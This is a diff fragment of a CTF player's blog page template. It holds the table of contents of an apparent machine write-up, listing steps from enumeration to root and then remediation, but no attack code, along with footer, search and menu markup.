+      aria-expanded="true"
+      aria-controls="toc-content"
+      aria-label="Toggle table of contents">
+      <svg
+        class="toc-burger-icon"
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        aria-hidden="true">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+      <span class="toc-toggle-text">Table of Contents</span>
+      <svg
+        class="toc-chevron-icon"
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        aria-hidden="true">
+        <polyline points="6 9 12 15 18 9"></polyline>
+      </svg>
+    </button>
+    <div class="toc-content" id="toc-content">
+      <nav class="toc-nav" aria-label="Table of Contents">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#target-summary">Target Summary</a></li>
+    <li><a href="#attack-chain">Attack Chain</a></li>
+    <li><a href="#requirements">Requirements</a></li>
+    <li><a href="#1-service-enumeration">1. Service Enumeration</a></li>
+    <li><a href="#2-virtual-host-discovery">2. Virtual Host Discovery</a></li>
+    <li><a href="#3-documentation-and-metadata">3. Documentation and Metadata</a></li>
+    <li><a href="#4-normal-enrollment">4. Normal Enrollment</a></li>
+    <li><a href="#5-duplicate-key-scope-escalation">5. Duplicate-Key Scope Escalation</a>
+      <ul>
+        <li><a href="#why-it-works">Why It Works</a></li>
+      </ul>
+    </li>
+    <li><a href="#6-qpak-format">6. qpak Format</a></li>
+    <li><a href="#7-double-decoded-preopen-traversal">7. Double-Decoded Preopen Traversal</a></li>
+    <li><a href="#8-command-execution-helper">8. Command Execution Helper</a></li>
+    <li><a href="#9-ssh-certificate-issuer-enumeration">9. SSH Certificate Issuer Enumeration</a></li>
+    <li><a href="#10-ssh-as-caden">10. SSH as caden</a></li>
+    <li><a href="#11-qctl-replay-enumeration">11. qctl Replay Enumeration</a></li>
+    <li><a href="#12-root-through-qctl-replay">12. Root Through qctl replay</a></li>
+    <li><a href="#13-cleanup">13. Cleanup</a></li>
+    <li><a href="#vulnerability-summary">Vulnerability Summary</a></li>
+    <li><a href="#remediation">Remediation</a>
+      <ul>
+        <li><a href="#enrollment-api">Enrollment API</a></li>
+        <li><a href="#qpak-runner">qpak Runner</a></li>
+        <li><a href="#ssh-certificate-issuer">SSH Certificate Issuer</a></li>
+        <li><a href="#maintenance-replay">Maintenance Replay</a></li>
+      </ul>
+    </li>
+    <li><a href="#reproduction-artifacts">Reproduction Artifacts</a></li>
+  </ul>
+</nav>
+      </nav>
+    </div>
+  </aside>
+
+
+  </div>
+
+    </main>
+
+    <footer>
+      <footer class="site-footer">
+  <div class="footer-content">
+    <p class="footer-text">
+      &copy;
+      
+      2026
+      
+      4mN3s14 | CTF Player &amp; Student.
+      
+    </p>
+    
+      <div class="footer-social">
+        <div class="social-links">
+  
+    <a
+      href="https://github.com/John-Jkar"
+      target="_blank"
+      rel="noopener noreferrer"
+      class="social-link"
+      aria-label="GitHub">
+      <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+        <path
+          fill-rule="evenodd"
+          d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"
+          clip-rule="evenodd"></path>
+      </svg>
+    </a>
+  
+
+  
+
+  
+
+  
+    <a
+      href="https://x.com/J0n4n1"
+      target="_blank"
+      rel="noopener noreferrer"
+      class="social-link"
+      aria-label="X (Twitter)">
+      <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+        <path
+          d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+      </svg>
+    </a>
+  
+
+  
+    <a href="mailto:kagimujkar@gmail.com" class="social-link" aria-label="Email">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
+      </svg>
+    </a>
+  
+</div>
+
+      </div>
+    
+  </div>
+</footer>
+
+    </footer>
+
+    <div id="search-modal" class="search-modal" aria-hidden="true" role="dialog" aria-label="Search" data-no-results="No results found">
+  <div class="search-modal-backdrop" id="search-modal-backdrop"></div>
+  <div class="search-modal-container">
+    <div class="search-input-wrapper">
+      <svg class="search-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+      </svg>
+      <input
+        type="search"
+        id="search-input"
+        class="search-input"
+        placeholder="Search..."
+        autocomplete="off"
+        aria-label="Search">
+      <button class="search-input-clear" id="search-input-clear" aria-label="Clear search">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+        </svg>
+      </button>
+      <button class="search-modal-close" id="search-modal-close" aria-label="Close search">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M6 18L18 6M6 6l12 12"></path>
+        </svg>
+      </button>
+    </div>
+    <div id="search-results" class="search-results"></div>
+  </div>
+</div>
+
+    
+<div id="mobile-menu" class="mobile-menu" aria-hidden="true">
+  <div class="mobile-menu-overlay"></div>
+  <div class="mobile-menu-content">
+    <div class="mobile-menu-header">
+      <span class="mobile-menu-title">Menu</span>
+      <button
+        id="mobile-menu-close"
+        class="mobile-menu-close"
+        aria-label="Close menu"
+        type="button">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+        </svg>
+      </button>
+    </div>
+    <nav class="mobile-menu-nav" role="navigation" aria-label="Mobile navigation">
+      <ul class="menu-list">
+  
+    <li class="menu-item">
+      <a
+        href="http://localhost:1313/myblog/"
+        class="menu-link ">
+        Home
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="http://localhost:1313/myblog/posts/"
+        class="menu-link ">
+        Posts
+      </a>
+    </li>
+  
+    <li class="menu-item">
+      <a
+        href="http://localhost:1313/myblog/about/"
+        class="menu-link ">
+        About
+      </a>
+    </li>
+  
+</ul>
+
+    </nav>
+    <div class="mobile-menu-footer">
+      <button id="mobile-search-toggle" class="mobile-search-toggle" aria-label="Search" type="button">
+        <svg class="search-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+        </svg>
+        <span>Search</span>
+      </button>
+      
+
+      <button class="theme-toggle" aria-label="Toggle theme" type="button">
+        <svg class="icon-sun" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path>
+        </svg>
+        <svg class="icon-moon" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path>
+        </svg>
+      </button>
+    </div>
+  </div>
+</div>
+
+    
+
+    <button id="scroll-to-top" class="scroll-to-top" aria-label="Scroll to top" type="button">
+  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
+  </svg>
+</button>
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="http://localhost:1313/myblog/js/main.min.137938305a4255a5ce0531471a42b4448c4adb05e04052a70000719c0704d082.js" defer></script>
+
+  </body>
+</html>
